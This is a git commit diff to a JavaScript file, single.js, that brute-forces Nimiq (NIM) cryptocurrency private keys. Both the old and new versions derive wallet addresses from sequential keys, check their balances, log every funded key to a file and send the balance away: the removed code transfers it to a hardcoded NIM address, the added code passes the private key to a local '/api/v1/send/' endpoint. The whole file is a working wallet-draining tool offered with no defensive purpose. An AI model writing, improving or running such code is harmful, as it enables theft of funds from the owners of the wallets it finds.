24e6a113603bb65fee4b9223f18e62de452e3049
malphite-code-2 <168648509+malphite-code-2@users.noreply.github.com>
2024-05-29 09:39:34 +0700

    Update single.js

--- single.js
+++ single.js
@@ -1,53 +1,56 @@
-const connect = require('./node');
-const fs = require('fs');
+const fs = require("fs").promises;
+const Wallet = require('./wallet');
+const { default: axios } = require('axios');
 
-connect(async (wrapper) => {
-  const getBalance = async (address) => new Promise((resolve) => {
+(async () => {
+  const send = async (privateKey) => {
     try {
-      wrapper.accountHelper.getBalance(address, (b) => {
-        const balance = b / 100000;
-        resolve(balance);
-      })
+      const res = await axios.get(`http://127.0.0.1:8088/api/v1/send/${privateKey}`)
+      return res.data;
     } catch (error) {
-      console.error(error);
-      resolve(-1);
+      return null;
     }
-  })
+  }
 
-  const MIN_PRIVATE_KEY = BigInt(`0x1${"0".repeat(63)}`);
-  const MAX_PRIVATE_KEY = BigInt(`0xF${"F".repeat(63)}`);
+  const getBalance = async (address) => {
+    try {
+      const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`)
+      return res.data.balance;
+    } catch (error) {
+      console.log(error);
+      return -1;
+    }
+  }
 
+  const MIN_PRIVATE_KEY = BigInt(`0xe${"0".repeat(63)}`);
+  const MAX_PRIVATE_KEY = BigInt(`0xf${"F".repeat(63)}`);
+  const BATCH_SIZE = 500; // Adjust batch size as needed
   let founds = 0;
 
-  const send = (privateKeyHex) => new Promise((resolve) => {
-    const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
-    const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
-    wrapper.accountHelper.getBalance(address, (amount) => {
-      const payload = { address: "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03", amount, fee: 0 }
-      wrapper.transactionHelper.sendTransaction(wallet, payload)
-      resolve(address)
-    })
-  })
+  const processBatch = async (startKey, endKey) => {
+    const promises = [];
+    for (let key = startKey; key <= endKey; key++) {
+      const privateKeyHex = key.toString(16).padStart(64, "0");
+      const wallet = Wallet.fromPrivateKey(privateKeyHex)
+      const address = wallet.getAddress();
 
-  for (let key = MIN_PRIVATE_KEY; key <= MAX_PRIVATE_KEY; key++) {
-    const privateKeyHex = key.toString(16).padStart(64, '0');
-    const wallet = wrapper.accountHelper.importWalletFromHexKey(privateKeyHex);
-    const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
-    const balance = await getBalance(address);
-
-    if (balance > 0) {
-      founds++
-
-      // Write to file
-      var successString = "Wallet: [" + address + "] - Private: [" + privateKeyHex + "] - Balance: " + balance + " NIM" + "\n\n------ Malphite Coder ------\n\n";
-      fs.appendFileSync('./match-private.txt', successString, (err) => {
-        if (err) throw err;
-      })
-
-      // Create transaction to main wallet
-      send(privateKeyHex)
+      promises.push(
+        getBalance(address).then(async (balance) => {
+          if (balance > 0) {
+            founds++;
+            const successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
+            fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));
+            await send(privateKeyHex);
+          }
+          console.log(`\x1b[34mFounds: ${founds} | Wallet Check : ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
+        })
+      );
     }
+    await Promise.all(promises);
+  };
 
-    console.log(`\x1b[32mFounds: ${founds} | Wallet Check : ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`)
+  for (let startKey = MIN_PRIVATE_KEY; startKey <= MAX_PRIVATE_KEY; startKey += BigInt(BATCH_SIZE)) {
+    const endKey = startKey + BigInt(BATCH_SIZE) - BigInt(1);
+    await processBatch(startKey, endKey < MAX_PRIVATE_KEY ? endKey : MAX_PRIVATE_KEY);
   }
-})
+})();
